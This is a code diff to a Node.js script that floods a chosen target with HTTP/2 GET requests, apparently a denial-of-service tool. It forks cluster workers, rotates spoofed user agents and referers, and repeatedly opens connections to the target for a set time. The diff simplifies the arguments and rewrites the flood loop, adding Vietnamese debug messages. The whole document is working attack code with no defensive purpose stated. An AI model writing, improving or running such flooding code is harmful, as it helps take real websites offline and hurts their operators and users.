@@ -10,9 +10,8 @@ const name = path.basename(file)
 const target = process.argv[2]
 const time = process.argv[3]
 const thread = process.argv[4]
-const rate = process.argv[5]
-if ( process.argv.length < 6 ) {
-	console.log("Using: node " + name + " [Target] [Time] [Thread] [Rate")
+if ( process.argv.length < 5 ) {
+	console.log("Using: node " + name + " [Target] [Time] [Thread]")
 	process.exit()
 }
 const useragent = [
@@ -140,40 +139,42 @@ const agent = new http.Agent({
 	maxSockets: Infinity,
 	maxTotalSockets: Infinity,
 })
-const headers = {
-	":method": "GET",
-	"globalAgent": agent,
-	"timeout": "5000",
-	"user-agent": ua,
-	"accept-language": lang,
-	"accept-encoding": en,
-	"referer": ref,
-}
 const options = {
-	host: target,
-	port: 443,
+	hostname: target,
 	method: "GET",
-	timeout: 5000,
+	timeout: 1000,
 	globalAgent: agent,
 	path: "/",
-	header: headers
+	headers: {
+		"Connection": "keep-alive",
+		"Referer": ref,
+		"Accept-language": lang,
+		"Accept-encoding": en,
+		"User-Agent": ua,
+	}
 }
 function flood() {
-	for ( let i = 0; i < rate;i++ ) {
+	const client = http2.connect(target)
+	const req = client.request(options)
+	req.on("response", () => {
 		const client = http2.connect(target)
 		const req = client.request(options)
 		req.on("response", () => {
-			req.close()
-			req.destroy()
-			flood()
+			console.log("Vong lap2")
+			req.end()
 			return
 		})
-		req.on("error", (error) => {
+		req.on("error", () => {
+			console.log("Loi vong lap")
 			req.destroy()
-			flood()
-			return
 		})
-	}
+		req.end()
+		return
+	})
+	req.on("error", () => {
+		req.destroy()
+		return
+	})
 }
 if ( cluster.isWorker ) {
 	setInterval(() => {
@@ -183,10 +184,11 @@ if ( cluster.isWorker ) {
 	setInterval(() => {
 		flood()
 	})
-	for ( let i =0; i < thread;i++ ) {
+	for ( let i = 0; i < thread;i++ ) {
 		cluster.fork()
 	}
 }
 setTimeout(() => {
 	process.exit()
 }, time * 1000)
+
